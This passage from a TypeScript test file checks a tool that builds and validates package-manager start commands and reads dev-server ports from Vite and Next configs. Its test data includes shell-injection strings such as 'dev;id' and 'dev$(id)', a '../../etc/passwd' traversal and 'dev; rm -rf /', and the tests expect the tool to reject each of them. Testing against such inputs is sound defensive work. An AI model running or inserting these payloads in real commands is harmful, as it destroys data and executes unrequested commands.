  // SCRIPT_NAME at all — anything with a space START_CMD's `npm run (\\S+)$` already refuses.
  const hostile = ["dev;id", "dev|id", "dev&&id", "dev$(id)", "dev`id`", "dev>out", "dev\\nid", "../../etc/passwd", ".", ".."];
  const scripts: Record<string, string> = { dev: "vite" };
  for (const name of hostile) scripts[name] = "vite";
  const files: Record<string, string | null> = {
    "package.json": JSON.stringify({ scripts, devDependencies: { vite: "^6.0.5" } }),
    "vite.config.ts": ROOT_VITE_CONFIG,
  };
  const base = ["package.json", "vite.config.ts", "index.html"];
  const locks: Array<[string, string]> = [["package-lock.json", "npm"], ["pnpm-lock.yaml", "pnpm"], ["yarn.lock", "yarn"], ["bun.lockb", "bun"]];
  for (const [lock, pm] of locks) {
    const paths = [...base, lock];
    const run = pm === "bun" ? "bun run" : `${pm} run`;
    assert.ok(isKnownStartCommand(`${run} dev`, paths, files), `${pm} still writes the honest command`);
    for (const name of hostile) {
      assert.equal(startCommandFor(pm as any, ".", name), null, `${pm}: ${name} must never be spelled into a command`);
      assert.equal(isKnownStartCommand(`${run} ${name}`, paths, files), false, `${pm}: ${name} must never be accepted back`);
    }
  }
});

test("isKnownStartCommand re-derives the command and rejects anything a shell would read differently", () => {
  const paths = ["frontend/package.json", "frontend/package-lock.json", "pnpm/package.json", "pnpm/pnpm-lock.yaml"];
  const files: Record<string, string | null> = {
    "frontend/package.json": vitePkg,
    "pnpm/package.json": JSON.stringify({ scripts: { dev: "vite" }, devDependencies: { vite: "^8" } }),
  };
  const ok = (cmd: string) => isKnownStartCommand(cmd, paths, files);

  assert.ok(ok("npm --prefix frontend run dev"));
  assert.ok(ok("npm --prefix frontend run dev -- --port 3001 --strictPort"));
  assert.ok(ok("pnpm --dir pnpm run dev -- --port 4000 --strictPort"));

  assert.equal(ok("npm --prefix frontend;x run dev"), false);
  assert.equal(ok("npm --prefix frontend run dev && x"), false);
  assert.equal(ok("npm --prefix frontend run dev -- --port 3001;x --strictPort"), false);
  assert.equal(ok("npm --prefix .. run dev"), false);
  assert.equal(ok("npm --prefix . run dev"), false);
  assert.equal(ok("npm --prefix frontend run deploy"), false, "the script must exist in that manifest");
  assert.equal(ok("npm --prefix backend run dev"), false, "the directory must be a package in this tree");
  assert.equal(ok("npm --prefix pnpm run dev"), false, "npm form for a pnpm lockfile is not what we would have written");
  assert.equal(ok("npm --prefix frontend run dev -- --port 80 --strictPort"), false);
  assert.equal(ok("npm --prefix frontend run dev -- --port 99999 --strictPort"), false);
  assert.equal(ok("npm --prefix frontend run dev -- --port 3001"), false);
  assert.equal(ok("$(id) --prefix frontend run dev"), false);

  assert.equal(startCommandFor("npm", "front end", "dev"), null);
  assert.equal(startCommandFor("npm", "-rf", "dev"), null);
  assert.equal(startCommandFor("npm", "frontend", "dev; rm -rf /"), null);
  assert.equal(startCommandFor("npm", "frontend", "dev", 3001.5), null);
  assert.equal(startCommandFor("bun", "frontend", "dev", 4173), "bun run --cwd frontend dev -- --port 4173 --strictPort");
  assert.equal(startCommandFor("yarn", "frontend", "dev"), "yarn --cwd frontend run dev");

  // The last gate before a command is committed: candidates that do not match the tree
  // they are written against produce no start at all.
  const stale = { webApp: { dir: "frontend", framework: "vite" as const, port: 3001 }, servers: [], loginScript: null, ambiguousWebApps: [], eligibleDirs: [] };
  assert.deepEqual(bootConfigFrom(stale, paths, { "frontend/package.json": JSON.stringify({ scripts: { serve: "vite" } }) }), {}, "no dev script in that manifest any more");
  assert.equal(bootConfigFrom(stale, paths, files).start, "npm --prefix frontend run dev -- --port 3001 --strictPort");
});

test("readVitePort takes the literal dev-server port, not a commented-out, nested or proxied one", () => {
  assert.equal(readVitePort(viteConfig(3001)), 3001);
  assert.equal(readVitePort("export default { preview: { port: 4173 }, build: {} };"), null, "only the server block sets the dev port");
  assert.equal(readVitePort("export default { server: { port: Number(process.env.PORT) } };"), null);
  assert.equal(readVitePort("export default { server: { port: 80 } };"), null, "privileged ports are not something CI can bind");
  assert.equal(readVitePort(null), null);

  assert.equal(readVitePort("// server: { port: 5000 }, // the old dev port\nexport default { server: { port: 3001 } };"), 3001, "a commented-out block is not configuration");
  assert.equal(readVitePort("/* dev notes: server: { port: 9999 } */\nexport default { server: { port: 3001 } };"), 3001);
  assert.equal(readVitePort("export default { server: { hmr: { port: 24679 }, port: 3001 } };"), 3001, "the hmr socket is not the dev server");
  assert.equal(readVitePort("export default { server: { proxy: { '/api': { target: 'http://x', port: 8787 } }, port: 3001 } };"), 3001, "a proxy target's port is not ours");
  assert.equal(readVitePort("export default { server: { proxy: { '/api': 'http://localhost:8787' } } };"), null, "no literal port: vite's default stands");

  const paths = ["web/package.json", "web/package-lock.json"];
  const files: Record<string, string | null> = { "web/package.json": vitePkg };
  const noConfig = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
  assert.deepEqual(noConfig.webApp, { dir: "web", framework: "vite", port: 5173 }, "vite's own default when nothing pins one");

  // A flag in the dev script is what the CLI binds, whatever the config file says.
  const flagged = inferBootCandidates({
    paths: [...paths, "web/vite.config.ts"],
    files: { "web/package.json": JSON.stringify({ scripts: { dev: "vite --port 3000 --host" }, devDependencies: { vite: "^8" } }), "web/vite.config.ts": viteConfig(5173) },
    mode: "separate",
    workflowTexts: [],
  });
  assert.deepEqual(flagged.webApp, { dir: "web", framework: "vite", port: 3000 });

  const next = inferBootCandidates({
    paths: ["web/package.json", "web/package-lock.json", "web/next.config.mjs"],
    files: {
      "web/package.json": JSON.stringify({ scripts: { dev: "next dev --port 4000" }, dependencies: { next: "15.0.0" } }),
      "web/next.config.mjs": "export default { async rewrites() { return [{ source: '/api/:p*', destination: 'http://localhost:9100/api/:p*' }]; } };",
    },
    mode: "separate",
    workflowTexts: [],
  });
  assert.deepEqual(next.webApp, { dir: "web", framework: "next", port: 4000 }, "next reads its port from its own dev script");
  assert.equal(
    bootConfigFrom(next, ["web/package.json", "web/package-lock.json"], { "web/package.json": JSON.stringify({ scripts: { dev: "next dev --port 4000" } }) }).start,
    "npm --prefix web run dev",
    "next keeps the port in the script, so we add no flags"
  );
});
